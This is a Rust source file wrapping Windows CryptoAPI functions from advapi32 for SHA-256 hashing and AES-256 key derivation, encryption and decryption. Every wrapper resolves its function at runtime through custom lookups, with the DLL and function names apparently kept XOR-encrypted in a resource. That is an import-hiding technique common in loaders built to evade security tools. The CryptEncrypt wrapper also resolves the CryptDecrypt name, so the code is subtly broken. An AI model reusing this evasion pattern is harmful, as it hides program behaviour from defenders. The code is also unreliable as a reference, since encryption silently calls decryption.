#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(unused)]

use crate::consts::*;
use crate::crypto_util::get_xor_encrypted_bytes;
use crate::util::get_resource_bytes;
use crate::windows::kernel32::{GetModuleHandleX, GetProcAddress, GetProcAddressX};

//advapi32.dll
pub type CryptAcquireContextW = unsafe extern "system" fn(
    phProv: *mut usize,
    szContainer: usize,
    szProvider: *const u16,
    dwProvType: u32,
    dwFlags: u32,
) -> bool;
pub type CryptCreateHash = unsafe extern "system" fn(
    phProv: usize,
    ALG_ID: u32,
    hKey: usize,
    dwFlags: u32,
    phHash: *mut usize,
) -> bool;
pub type CryptHashData = unsafe extern "system" fn(
    hHash: usize,
    pbData: *const u8,
    dwDataLen: u32,
    dwFlags: u32,
) -> bool;
pub type CryptSetKeyParam =
    unsafe extern "system" fn(hKey: usize, dwParam: u32, pbData: *const u8, dwFlags: u32) -> bool;
pub type CryptGetKeyParam = unsafe extern "system" fn(
    hKey: usize,
    dwParam: u32,
    pbData: *mut u8,
    pbDataLen: *mut u32,
    dwFlags: u32,
) -> bool;
pub type CryptDeriveKey = unsafe extern "system" fn(
    hHash: usize,
    Algid: u32,
    hBaseData: usize,
    dwFlags: u32,
    phKey: *mut usize,
) -> bool;
pub type CryptDecrypt = unsafe extern "system" fn(
    hKey: usize,
    hHash: usize,
    Final: u32,
    dwFlags: u32,
    pbData: *mut u8,
    pdwDataLen: *mut u32,
) -> bool;
pub type CryptEncrypt = unsafe extern "system" fn(
    hKey: usize,
    hHash: usize,
    Final: u32,
    dwFlags: u32,
    pbData: *mut u8,
    pdwDataLen: *mut u32,
    dwBufLen: u32,
) -> bool;

pub type CryptReleaseContext = unsafe extern "system" fn(hProv: usize, dwFlags: u32) -> bool;
pub type CryptDestroyKey = unsafe extern "system" fn(hKey: usize) -> bool;
pub type CryptDestroyHash = unsafe extern "system" fn(hHash: usize) -> bool;

pub const ALG_CLASS_HASH: u32 = 4 << 13;
pub const ALG_TYPE_ANY: u32 = 0;
pub const ALG_SID_SHA_256: u32 = 12;
pub const CALG_SHA_256: u32 = ALG_CLASS_HASH | ALG_TYPE_ANY | ALG_SID_SHA_256;

pub const ALG_CLASS_DATA_ENCRYPT: u32 = 3 << 13;
pub const ALG_TYPE_BLOCK: u32 = 3 << 9;
pub const ALG_SID_AES_256: u32 = 16;
pub const CALG_AES_256: u32 = ALG_CLASS_DATA_ENCRYPT | ALG_TYPE_BLOCK | ALG_SID_AES_256;

pub const KP_IV: u32 = 1;
pub const KP_BLOCKLEN: u32 = 8u32;
pub const KP_KEYLEN: u32 = 9u32;

pub const PROV_RSA_AES: u32 = 24;
pub const CRYPT_VERIFYCONTEXT: u32 = 0xF0000000;

pub unsafe fn CryptAcquireContextW(
    phProv: *mut usize,
    szContainer: usize,
    szProvider: *const u16,
    dwProvType: u32,
    dwFlags: u32,
) -> bool {
    let cryptAcquireContextW: CryptAcquireContextW = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, ADVAPI32_DLL_POS, ADVAPI32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, ADVAPI32_DLL_KEY, ADVAPI32_DLL_LEN),
        ),
        get_resource_bytes(
            RESOURCE_ID,
            CRYPTACQUIRECONTEXTW_POS,
            CRYPTACQUIRECONTEXTW_LEN,
        ),
        get_resource_bytes(
            RESOURCE_ID,
            CRYPTACQUIRECONTEXTW_KEY,
            CRYPTACQUIRECONTEXTW_LEN,
        ),
    ));

    cryptAcquireContextW(phProv, szContainer, szProvider, dwProvType, dwFlags)
}

pub unsafe fn CryptCreateHash(
    phProv: usize,
    ALG_ID: u32,
    hKey: usize,
    dwFlags: u32,
    phHash: *mut usize,
) -> bool {
    let cryptCreateHash: CryptCreateHash = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, ADVAPI32_DLL_POS, ADVAPI32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, ADVAPI32_DLL_KEY, ADVAPI32_DLL_LEN),
        ),
        get_resource_bytes(RESOURCE_ID, CRYPTCREATEHASH_POS, CRYPTCREATEHASH_LEN),
        get_resource_bytes(RESOURCE_ID, CRYPTCREATEHASH_KEY, CRYPTCREATEHASH_LEN),
    ));

    cryptCreateHash(phProv, ALG_ID, hKey, dwFlags, phHash)
}

pub unsafe fn CryptHashData(hHash: usize, pbData: *const u8, dwDataLen: u32, dwFlags: u32) -> bool {
    let cryptHashData: CryptHashData = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, ADVAPI32_DLL_POS, ADVAPI32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, ADVAPI32_DLL_KEY, ADVAPI32_DLL_LEN),
        ),
        get_resource_bytes(RESOURCE_ID, CRYPTHASHDATA_POS, CRYPTHASHDATA_LEN),
        get_resource_bytes(RESOURCE_ID, CRYPTHASHDATA_KEY, CRYPTHASHDATA_LEN),
    ));

    cryptHashData(hHash, pbData, dwDataLen, dwFlags)
}

pub unsafe fn CryptDeriveKey(
    hHash: usize,
    Algid: u32,
    hBaseData: usize,
    dwFlags: u32,
    phKey: *mut usize,
) -> bool {
    let cryptDeriveKey: CryptDeriveKey = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, ADVAPI32_DLL_POS, ADVAPI32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, ADVAPI32_DLL_KEY, ADVAPI32_DLL_LEN),
        ),
        get_resource_bytes(RESOURCE_ID, CRYPTDERIVEKEY_POS, CRYPTDERIVEKEY_LEN),
        get_resource_bytes(RESOURCE_ID, CRYPTDERIVEKEY_KEY, CRYPTDERIVEKEY_LEN),
    ));

    cryptDeriveKey(hHash, Algid, hBaseData, dwFlags, phKey)
}

pub unsafe fn CryptSetKeyParam(hKey: usize, dwParam: u32, pbData: *const u8, dwFlags: u32) -> bool {
    let cryptSetKeyParam: CryptSetKeyParam = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, ADVAPI32_DLL_POS, ADVAPI32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, ADVAPI32_DLL_KEY, ADVAPI32_DLL_LEN),
        ),
        get_resource_bytes(RESOURCE_ID, CRYPTSETKEYPARAM_POS, CRYPTSETKEYPARAM_LEN),
        get_resource_bytes(RESOURCE_ID, CRYPTSETKEYPARAM_KEY, CRYPTSETKEYPARAM_LEN),
    ));

    cryptSetKeyParam(hKey, dwParam, pbData, dwFlags)
}

pub unsafe fn CryptGetKeyParam(
    hKey: usize,
    dwParam: u32,
    pbData: *mut u8,
    pbDataLen: *mut u32,
    dwFlags: u32,
) -> bool {
    let cryptGetKeyParam: CryptGetKeyParam = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, ADVAPI32_DLL_POS, ADVAPI32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, ADVAPI32_DLL_KEY, ADVAPI32_DLL_LEN),
        ),
        get_resource_bytes(RESOURCE_ID, CRYPTGETKEYPARAM_POS, CRYPTGETKEYPARAM_LEN),
        get_resource_bytes(RESOURCE_ID, CRYPTGETKEYPARAM_KEY, CRYPTGETKEYPARAM_LEN),
    ));

    cryptGetKeyParam(hKey, dwParam, pbData, pbDataLen, dwFlags)
}

pub unsafe fn CryptDecrypt(
    hKey: usize,
    hHash: usize,
    Final: u32,
    dwFlags: u32,
    pbData: *mut u8,
    pdwDataLen: *mut u32,
) -> bool {
    let cryptDecrypt: CryptDecrypt = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, ADVAPI32_DLL_POS, ADVAPI32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, ADVAPI32_DLL_KEY, ADVAPI32_DLL_LEN),
        ),
        get_resource_bytes(RESOURCE_ID, CRYPTDECRYPT_POS, CRYPTDECRYPT_LEN),
        get_resource_bytes(RESOURCE_ID, CRYPTDECRYPT_KEY, CRYPTDECRYPT_LEN),
    ));

    cryptDecrypt(hKey, hHash, Final, dwFlags, pbData, pdwDataLen)
}

pub unsafe fn CryptEncrypt(
    hKey: usize,
    hHash: usize,
    Final: u32,
    dwFlags: u32,
    pbData: *mut u8,
    pdwDataLen: *mut u32,
    dwBufLen: u32,
) -> bool {
    let cryptEncrypt: CryptEncrypt = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, ADVAPI32_DLL_POS, ADVAPI32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, ADVAPI32_DLL_KEY, ADVAPI32_DLL_LEN),
        ),
        get_resource_bytes(RESOURCE_ID, CRYPTDECRYPT_POS, CRYPTDECRYPT_LEN),
        get_resource_bytes(RESOURCE_ID, CRYPTDECRYPT_KEY, CRYPTDECRYPT_LEN),
    ));

    cryptEncrypt(hKey, hHash, Final, dwFlags, pbData, pdwDataLen, dwBufLen)
}

pub unsafe fn CryptReleaseContext(hProv: usize, dwFlags: u32) -> bool {
    let cryptReleaseContext: CryptReleaseContext = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, ADVAPI32_DLL_POS, ADVAPI32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, ADVAPI32_DLL_KEY, ADVAPI32_DLL_LEN),
        ),
        get_resource_bytes(
            RESOURCE_ID,
            CRYPTRELEASECONTEXT_POS,
            CRYPTRELEASECONTEXT_LEN,
        ),
        get_resource_bytes(
            RESOURCE_ID,
            CRYPTRELEASECONTEXT_KEY,
            CRYPTRELEASECONTEXT_LEN,
        ),
    ));

    cryptReleaseContext(hProv, dwFlags)
}

pub unsafe fn CryptDestroyKey(hKey: usize) -> bool {
    let cryptDestroyKey: CryptDestroyKey = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, ADVAPI32_DLL_POS, ADVAPI32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, ADVAPI32_DLL_KEY, ADVAPI32_DLL_LEN),
        ),
        get_resource_bytes(RESOURCE_ID, CRYPTDESTROYKEY_POS, CRYPTDESTROYKEY_LEN),
        get_resource_bytes(RESOURCE_ID, CRYPTDESTROYKEY_KEY, CRYPTDESTROYKEY_LEN),
    ));

    cryptDestroyKey(hKey)
}

pub unsafe fn CryptDestroyHash(hHash: usize) -> bool {
    let cryptDestroyHash: CryptDestroyHash = std::mem::transmute(GetProcAddressX(
        GetModuleHandleX(
            get_resource_bytes(RESOURCE_ID, ADVAPI32_DLL_POS, ADVAPI32_DLL_LEN),
            get_resource_bytes(RESOURCE_ID, ADVAPI32_DLL_KEY, ADVAPI32_DLL_LEN),
        ),
        get_resource_bytes(RESOURCE_ID, CRYPTDESTROYHASH_POS, CRYPTDESTROYHASH_LEN),
        get_resource_bytes(RESOURCE_ID, CRYPTDESTROYHASH_KEY, CRYPTDESTROYHASH_LEN),
    ));

    cryptDestroyHash(hHash)
}
